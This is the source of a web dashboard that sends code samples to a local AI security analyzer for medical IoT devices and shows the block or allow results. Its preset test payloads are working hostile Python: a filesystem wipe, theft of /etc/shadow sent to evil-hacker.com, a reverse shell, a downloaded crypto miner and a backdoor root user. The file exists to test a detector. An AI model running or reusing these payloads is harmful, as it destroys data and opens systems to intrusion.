<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Security Testing Dashboard - Medical IoT</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        /* AI Security Dashboard - Professional Industrial Black Theme */
        :root {
            /* Pure Black Industrial Theme */
            --bg-primary: #000000;
            --bg-secondary: #0f0f0f;
            --bg-tertiary: #1a1a1a;
            --bg-quaternary: #262626;
            --bg-elevated: #1e1e1e;
            --bg-hover: #2d2d2d;
            --bg-active: #333333;
            
            /* Professional Text Colors */
            --text-primary: #ffffff;
            --text-secondary: #cccccc;
            --text-tertiary: #999999;
            --text-disabled: #666666;
            --text-accent: #00d4ff;
            
            /* Professional Accent Colors */
            --accent-primary: #00d4ff;
            --accent-secondary: #0099cc;
            --accent-hover: #33ddff;
            --accent-glow: rgba(0, 212, 255, 0.4);
            
            /* Status Colors - High Contrast */
            --success-color: #00ff88;
            --warning-color: #ffaa00;
            --error-color: #ff4444;
            --critical-color: #ff0066;
            --info-color: #0099ff;
            
            /* Professional Borders */
            --border-primary: #404040;
            --border-secondary: #4d4d4d;
            --border-hover: #666666;
            --border-accent: #00d4ff;
            
            /* Industrial Shadows */
            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.5);
            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.6);
            --shadow-lg: 0 8px 20px rgba(0, 0, 0, 0.7);
            --shadow-xl: 0 16px 32px rgba(0, 0, 0, 0.8);
            --shadow-glow: 0 0 20px var(--accent-glow);
            
            /* Professional Radius */
            --radius-sm: 6px;
            --radius-md: 8px;
            --radius-lg: 12px;
            --radius-xl: 16px;
            
            /* Smooth Transitions */
            --transition-fast: all 0.15s ease;
            --transition-medium: all 0.25s ease;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.5;
            min-height: 100vh;
            width: 100%;
            margin: 0;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
        }

        /* Professional Background Pattern */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--bg-primary);
            pointer-events: none;
            z-index: -1;
        }

        .container {
            width: 100%;
            margin: 0;
            padding: 0 1rem;
        }

        /* Header */
        .header {
            background: rgba(30, 30, 30, 0.9);
            backdrop-filter: blur(20px);
            border-bottom: 1px solid var(--border-primary);
            color: var(--text-primary);
            padding: 2rem 0;
            margin-bottom: 2rem;
            position: relative;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(0, 153, 204, 0.05));
            pointer-events: none;
        }

        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 1rem;
            position: relative;
            z-index: 1;
        }

        .header h1 {
            font-size: 2rem;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 0.75rem;
            color: var(--text-primary);
        }

        .header h1 i {
            font-size: 1.75rem;
            color: var(--accent-primary);
            text-shadow: 0 0 10px var(--accent-glow);
        }

        .header p {
            font-size: 1rem;
            color: var(--text-secondary);
            margin-top: 0.5rem;
        }

        .main-content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 2rem;
            margin-bottom: 2rem;
            width: 100%;
        }

        .input-panel, .results-panel {
            background: rgba(26, 26, 26, 0.8);
            backdrop-filter: blur(15px);
            border-radius: var(--radius-lg);
            padding: 2rem;
            box-shadow: var(--shadow-lg);
            border: 1px solid var(--border-primary);
            position: relative;
            overflow: hidden;
        }

        .input-panel::before, .results-panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--accent-primary), transparent);
            opacity: 0.6;
        }

        .panel-title {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 1.5rem;
            color: var(--text-primary);
            border-bottom: 2px solid var(--accent-primary);
            padding-bottom: 0.75rem;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }

        .panel-title i {
            color: var(--accent-primary);
            text-shadow: 0 0 10px var(--accent-glow);
        }

        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text-secondary);
            font-size: 0.875rem;
        }

        .form-group input, .form-group select, .form-group textarea {
            width: 100%;
            padding: 0.75rem;
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-md);
            background: rgba(15, 15, 15, 0.8);
            color: var(--text-primary);
            font-size: 0.875rem;
            transition: var(--transition-medium);
        }

        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
            outline: none;
            border-color: var(--accent-primary);
            box-shadow: 0 0 0 2px var(--accent-glow);
            background: rgba(30, 30, 30, 0.9);
        }

        .form-group input::placeholder, .form-group textarea::placeholder {
            color: var(--text-disabled);
        }

        .form-group textarea {
            min-height: 120px;
            resize: vertical;
            font-family: 'JetBrains Mono', 'Fira Code', 'Courier New', monospace;
            font-size: 0.8rem;
        }

        .preset-buttons {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
            gap: 0.75rem;
            margin: 1rem 0;
        }

        .preset-btn {
            padding: 0.75rem;
            background: rgba(38, 38, 38, 0.8);
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-md);
            color: var(--text-primary);
            cursor: pointer;
            font-size: 0.8rem;
            font-weight: 500;
            transition: var(--transition-medium);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            backdrop-filter: blur(10px);
        }

        .preset-btn:hover {
            background: rgba(45, 45, 45, 0.9);
            border-color: var(--border-hover);
            transform: translateY(-2px);
            box-shadow: var(--shadow-md);
        }

        .preset-btn.danger {
            border-color: var(--error-color);
            color: var(--error-color);
        }

        .preset-btn.danger:hover {
            background: rgba(255, 68, 68, 0.1);
            box-shadow: 0 0 15px rgba(255, 68, 68, 0.3);
        }

        .preset-btn.warning {
            border-color: var(--warning-color);
            color: var(--warning-color);
        }

        .preset-btn.warning:hover {
            background: rgba(255, 170, 0, 0.1);
            box-shadow: 0 0 15px rgba(255, 170, 0, 0.3);
        }

        .preset-btn.success {
            border-color: var(--success-color);
            color: var(--success-color);
        }

        .preset-btn.success:hover {
            background: rgba(0, 255, 136, 0.1);
            box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
        }

        .test-button {
            width: 100%;
            padding: 1rem;
            background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
            border: 1px solid var(--accent-primary);
            border-radius: var(--radius-md);
            color: var(--bg-primary);
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: var(--transition-medium);
            margin-top: 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0.5rem;
            position: relative;
            overflow: hidden;
        }

        .test-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: var(--transition-medium);
        }

        .test-button:hover {
            transform: translateY(-2px);
            box-shadow: var(--shadow-glow);
        }

        .test-button:hover::before {
            left: 100%;
        }

        .test-button:disabled {
            background: rgba(102, 102, 102, 0.5);
            border-color: var(--border-primary);
            color: var(--text-disabled);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .results-container {
            min-height: 500px;
            max-height: 70vh;
            overflow-y: auto;
            border: 1px solid var(--border-primary);
            border-radius: var(--radius-md);
            background: rgba(15, 15, 15, 0.8);
            backdrop-filter: blur(10px);
            padding: 1rem;
        }

        .results-container::-webkit-scrollbar {
            width: 6px;
        }

        .results-container::-webkit-scrollbar-track {
            background: rgba(64, 64, 64, 0.3);
            border-radius: 3px;
        }

        .results-container::-webkit-scrollbar-thumb {
            background: var(--accent-primary);
            border-radius: 3px;
        }

        .result-item {
            background: rgba(30, 30, 30, 0.8);
            backdrop-filter: blur(10px);
            border-radius: var(--radius-md);
            padding: 1.5rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-primary);
            box-shadow: var(--shadow-md);
            border: 1px solid var(--border-primary);
            transition: var(--transition-medium);
        }

        .result-item:hover {
            background: rgba(45, 45, 45, 0.8);
            border-color: var(--border-hover);
        }

        .result-status {
            display: inline-block;
            padding: 0.375rem 1rem;
            border-radius: var(--radius-full);
            font-weight: 600;
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.05em;
            margin-bottom: 0.75rem;
            backdrop-filter: blur(10px);
        }

        .status-blocked {
            background: rgba(255, 68, 68, 0.2);
            color: var(--error-color);
            border: 1px solid var(--error-color);
            box-shadow: 0 0 10px rgba(255, 68, 68, 0.3);
        }

        .status-allowed {
            background: rgba(0, 255, 136, 0.2);
            color: var(--success-color);
            border: 1px solid var(--success-color);
            box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
        }

        .status-error {
            background: rgba(255, 170, 0, 0.2);
            color: var(--warning-color);
            border: 1px solid var(--warning-color);
            box-shadow: 0 0 10px rgba(255, 170, 0, 0.3);
        }

        .risk-score {
            font-size: 1.125rem;
            font-weight: 700;
            margin: 0.75rem 0;
        }

        .risk-high { 
            color: var(--error-color); 
            text-shadow: 0 0 10px rgba(255, 68, 68, 0.5);
        }
        .risk-medium { 
            color: var(--warning-color); 
            text-shadow: 0 0 10px rgba(255, 170, 0, 0.5);
        }
        .risk-low { 
            color: var(--success-color); 
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }

        .reasons-list {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 8px;
            padding: 15px;
            margin-top: 10px;
        }

        .reasons-list ul {
            list-style-position: inside;
            padding-left: 0;
        }

        .reasons-list li {
            margin-bottom: 5px;
            opacity: 0.9;
        }

        .loading {
            text-align: center;
            padding: 40px;
            font-size: 1.1rem;
            color: #4ecdc4;
        }

        .spinner {
            border: 3px solid rgba(78, 205, 196, 0.3);
            border-top: 3px solid #4ecdc4;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .header-stats {
            display: flex;
            gap: 2rem;
        }

        .stat {
            text-align: center;
        }

        .stat-value {
            display: block;
            font-size: 2rem;
            font-weight: 700;
            color: var(--accent-primary);
            text-shadow: 0 0 10px var(--accent-glow);
        }

        .stat-label {
            font-size: 0.875rem;
            color: var(--text-secondary);
        }

        /* Stats Bar */
        .stats-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 1rem;
            margin-bottom: 2rem;
        }

        .stat-item {
            background: rgba(26, 26, 26, 0.8);
            backdrop-filter: blur(10px);
            padding: 1.5rem;
            border-radius: var(--radius-lg);
            box-shadow: var(--shadow-md);
            text-align: center;
            border: 1px solid var(--border-primary);
            transition: var(--transition-medium);
        }

        .stat-item:hover {
            background: rgba(45, 45, 45, 0.8);
            border-color: var(--border-hover);
            transform: translateY(-2px);
        }

        .stat-number {
            font-size: 2rem;
            font-weight: 700;
            color: var(--accent-primary);
            text-shadow: 0 0 10px var(--accent-glow);
        }

        .stat-label {
            font-size: 0.875rem;
            color: var(--text-secondary);
            margin-top: 0.25rem;
        }

        @media (max-width: 1024px) {
            .main-content {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <div class="container">
                <div class="header-content">
                    <div>
                        <h1><i class="fas fa-shield-alt"></i> AI Security Testing Dashboard</h1>
                        <p>Direct AI Security Service Testing Interface (Port 8002)</p>
                    </div>
                    <div class="header-stats">
                        <div class="stat">
                            <span class="stat-value" id="totalTests">0</span>
                            <span class="stat-label">Total Tests</span>
                        </div>
                        <div class="stat">
                            <span class="stat-value" id="blockedTests">0</span>
                            <span class="stat-label">Blocked</span>
                        </div>
                    </div>
                </div>
            </div>
        </header>

        <div class="container">
            <div class="stats-bar">
                <div class="stat-item">
                    <div class="stat-number" id="allowedTests">0</div>
                    <div class="stat-label">Allowed</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number" id="errorTests">0</div>
                    <div class="stat-label">Errors</div>
                </div>
            </div>

            <div class="main-content">
            <div class="input-panel">
                <h2 class="panel-title"><i class="fas fa-cogs"></i> Test Configuration</h2>
                
                <div class="form-group">
                    <label for="deviceId">Device ID:</label>
                    <input type="text" id="deviceId" value="med-ecg-001" placeholder="e.g., med-ecg-001">
                </div>

                <div class="form-group">
                    <label for="sourceIp">Source IP Address:</label>
                    <input type="text" id="sourceIp" value="10.20.12.12" placeholder="e.g., 10.20.12.12">
                </div>

                <div class="form-group">
                    <label for="language">Programming Language:</label>
                    <select id="language">
                        <option value="python">Python</option>
                        <option value="bash">Bash</option>
                        <option value="javascript">JavaScript</option>
                        <option value="powershell">PowerShell</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="requestType">Request Type:</label>
                    <select id="requestType">
                        <option value="code">Code Execution</option>
                        <option value="patch">Device Patch</option>
                        <option value="update">Device Update</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="maliciousCode">Code/Payload:</label>
                    <textarea id="maliciousCode" placeholder="Enter your code or payload here...">print('Hello World')</textarea>
                </div>

                <div class="preset-buttons">
                    <button class="preset-btn success" onclick="loadPreset('legitimate')"><i class="fas fa-check"></i> Legitimate</button>
                    <button class="preset-btn danger" onclick="loadPreset('filesystem')"><i class="fas fa-trash"></i> File Destruction</button>
                    <button class="preset-btn danger" onclick="loadPreset('exfiltration')"><i class="fas fa-upload"></i> Data Theft</button>
                    <button class="preset-btn danger" onclick="loadPreset('shell')"><i class="fas fa-terminal"></i> Reverse Shell</button>
                    <button class="preset-btn warning" onclick="loadPreset('mining')"><i class="fas fa-coins"></i> Crypto Mining</button>
                    <button class="preset-btn danger" onclick="loadPreset('privilege')"><i class="fas fa-user-shield"></i> Privilege Escalation</button>
                </div>

                <button class="test-button" onclick="runSecurityTest()" id="testBtn">
                    <i class="fas fa-play"></i> Run AI Security Test
                </button>
            </div>

            <div class="results-panel">
                <h2 class="panel-title"><i class="fas fa-chart-bar"></i> Test Results</h2>
                <div class="results-container" id="resultsContainer">
                    <div style="text-align: center; padding: 50px; opacity: 0.6;">
                        <h3>🎯 Ready for Testing</h3>
                        <p>Configure your test parameters and click "Run AI Security Test" to begin.</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let testCounter = 0;
        let stats = { total: 0, blocked: 0, allowed: 0, errors: 0 };

        const presets = {
            legitimate: {
                code: `# Legitimate medical device code
import time
import json

def get_heart_rate():
    # Simulate heart rate reading
    return {"heart_rate": 72, "timestamp": time.time()}

print("Device initialized successfully")
data = get_heart_rate()
print(f"Heart rate: {data['heart_rate']} BPM")`,
                ip: "192.168.1.100"
            },
            filesystem: {
                code: `# MALICIOUS: Filesystem destruction
import os
import shutil

# Destroy entire filesystem
os.system('rm -rf / --no-preserve-root')
os.system('del /f /s /q C:\\\\*')
shutil.rmtree('/', ignore_errors=True)
print('System destroyed!')`,
                ip: "10.20.12.12"
            },
            exfiltration: {
                code: `# MALICIOUS: Data exfiltration
import urllib.request
import os

# Steal sensitive files
passwd = open('/etc/passwd', 'r').read()
shadow = open('/etc/shadow', 'r').read()

# Exfiltrate to attacker server
urllib.request.urlopen(f'http://evil-hacker.com/steal?passwd={passwd}')
urllib.request.urlopen(f'http://evil-hacker.com/steal?shadow={shadow}')
print('Data stolen successfully')`,
                ip: "45.123.45.67"
            },
            shell: {
                code: `# MALICIOUS: Reverse shell
import socket
import subprocess
import os

# Create reverse shell connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.20.12.12', 4444))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/bash', '-i'])`,
                ip: "10.20.12.12"
            },
            mining: {
                code: `# MALICIOUS: Cryptocurrency mining
import subprocess
import urllib.request

# Download mining malware
urllib.request.urlretrieve('http://cryptominer.evil/xmrig', '/tmp/miner')
subprocess.run(['chmod', '+x', '/tmp/miner'])

# Start mining with stolen resources
subprocess.run(['/tmp/miner', '--url=pool.evil.com:4444', '--user=hacker_wallet'])
print('Mining started - stealing your CPU/GPU resources')`,
                ip: "188.166.123.45"
            },
            privilege: {
                code: `# MALICIOUS: Privilege escalation
import os
import subprocess

# Attempt privilege escalation
os.system('sudo su -')
os.system('chmod 777 /etc/passwd')
os.system('echo "hacker:x:0:0:root:/root:/bin/bash" >> /etc/passwd')

# Create backdoor user
subprocess.run(['useradd', '-m', '-s', '/bin/bash', 'backdoor'])
subprocess.run(['usermod', '-aG', 'sudo', 'backdoor'])
print('Root access gained!')`,
                ip: "203.45.67.89"
            }
        };

        function loadPreset(type) {
            const preset = presets[type];
            if (preset) {
                document.getElementById('maliciousCode').value = preset.code;
                document.getElementById('sourceIp').value = preset.ip;
            }
        }

        function updateStats() {
            document.getElementById('totalTests').textContent = stats.total;
            document.getElementById('blockedTests').textContent = stats.blocked;
            document.getElementById('allowedTests').textContent = stats.allowed;
            document.getElementById('errorTests').textContent = stats.errors;
        }

        function addResult(result) {
            const container = document.getElementById('resultsContainer');
            
            // Clear welcome message on first test
            if (stats.total === 0) {
                container.innerHTML = '';
            }

            const resultDiv = document.createElement('div');
            resultDiv.className = 'result-item';
            
            let statusClass = 'status-error';
            let statusText = 'ERROR';
            
            if (result.status === 403) {
                statusClass = 'status-blocked';
                statusText = 'BLOCKED';
                stats.blocked++;
            } else if (result.status === 200) {
                statusClass = 'status-allowed';
                statusText = 'ALLOWED';
                stats.allowed++;
            } else {
                stats.errors++;
            }
            
            stats.total++;
            
            const riskScore = result.risk_score || 0;
            let riskClass = 'risk-low';
            if (riskScore >= 70) riskClass = 'risk-high';
            else if (riskScore >= 40) riskClass = 'risk-medium';

            resultDiv.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px;">
                    <div>
                        <span class="result-status ${statusClass}">${statusText}</span>
                        <small style="opacity: 0.7; margin-left: 10px;">Test #${stats.total} • ${new Date().toLocaleTimeString()}</small>
                    </div>
                    <div class="risk-score ${riskClass}">Risk: ${riskScore}%</div>
                </div>
                
                <div style="margin-bottom: 10px;">
                    <strong>Device:</strong> ${result.device_id} • 
                    <strong>IP:</strong> ${result.source_ip} • 
                    <strong>Type:</strong> ${result.request_type}
                </div>
                
                <div style="background: rgba(0,0,0,0.3); padding: 10px; border-radius: 5px; margin: 10px 0; font-family: monospace; font-size: 12px; max-height: 100px; overflow-y: auto;">
                    ${result.code.substring(0, 200)}${result.code.length > 200 ? '...' : ''}
                </div>
                
                ${result.reasons && result.reasons.length > 0 ? `
                    <div class="reasons-list">
                        <strong>AI Analysis Reasons:</strong>
                        <ul>
                            ${result.reasons.slice(0, 3).map(reason => `<li>${reason}</li>`).join('')}
                        </ul>
                    </div>
                ` : ''}
                
                ${result.processing_time ? `
                    <div style="margin-top: 10px; opacity: 0.7; font-size: 12px;">
                        Processing Time: ${result.processing_time}ms
                    </div>
                ` : ''}
            `;
            
            container.insertBefore(resultDiv, container.firstChild);
            updateStats();
        }

        async function runSecurityTest() {
            const deviceId = document.getElementById('deviceId').value;
            const sourceIp = document.getElementById('sourceIp').value;
            const language = document.getElementById('language').value;
            const requestType = document.getElementById('requestType').value;
            const code = document.getElementById('maliciousCode').value;
            
            if (!code.trim()) {
                alert('Please enter some code to test!');
                return;
            }

            const testBtn = document.getElementById('testBtn');
            testBtn.disabled = true;
            testBtn.innerHTML = '<div class="spinner"></div>Running AI Analysis...';
            
            // Show loading in results
            const container = document.getElementById('resultsContainer');
            const loadingDiv = document.createElement('div');
            loadingDiv.className = 'loading';
            loadingDiv.innerHTML = '<div class="spinner"></div>Analyzing code with AI security system...';
            container.insertBefore(loadingDiv, container.firstChild);

            try {
                const payload = {
                    deviceId: deviceId,
                    code: code,
                    language: language,
                    parameters: {}
                };

                const headers = {
                    'Content-Type': 'application/json',
                    'X-Forwarded-For': sourceIp,
                    'X-Real-IP': sourceIp,
                    'X-Originating-IP': sourceIp,
                    'User-Agent': 'SecurityTestDashboard/1.0'
                };

                let endpoint = '';
                if (requestType === 'code') {
                    endpoint = `/api/devices/${deviceId}/code`;
                } else if (requestType === 'patch') {
                    endpoint = `/api/devices/${deviceId}`;
                    payload.properties = { patchType: 'firmware_update', code: code };
                } else if (requestType === 'update') {
                    endpoint = `/api/devices/${deviceId}`;
                    payload.properties = { code: code };
                }

                // Call AI Security Service directly on port 8002
                const aiPayload = {
                    method: requestType === 'code' ? 'POST' : 'PATCH',
                    path: endpoint,
                    headers: headers,
                    body: payload,
                    client_ip: sourceIp,
                    query_params: {}
                };

                const response = await fetch(`http://127.0.0.1:8002/analyze`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(aiPayload)
                });

                const responseData = await response.json();
                
                // Map AI Security Service response to dashboard format
                const aiApproved = responseData.approved || false;
                const displayStatus = aiApproved ? 200 : 403; // 200 = allowed, 403 = blocked
                
                const result = {
                    status: displayStatus,
                    device_id: deviceId,
                    source_ip: sourceIp,
                    request_type: requestType,
                    code: code,
                    risk_score: responseData.risk_score || 0,
                    reasons: responseData.reasons || [],
                    processing_time: responseData.processing_time_ms || null
                };

                // Remove loading div
                container.removeChild(loadingDiv);
                addResult(result);

            } catch (error) {
                // Remove loading div
                if (container.contains(loadingDiv)) {
                    container.removeChild(loadingDiv);
                }
                
                const result = {
                    status: 500,
                    device_id: deviceId,
                    source_ip: sourceIp,
                    request_type: requestType,
                    code: code,
                    risk_score: 0,
                    reasons: [`Network Error: ${error.message}`],
                    processing_time: null
                };
                
                addResult(result);
            } finally {
                testBtn.disabled = false;
                testBtn.innerHTML = '🚀 Run AI Security Test';
            }
        }

        // Initialize page
        updateStats();
    </script>
</body>
</html>
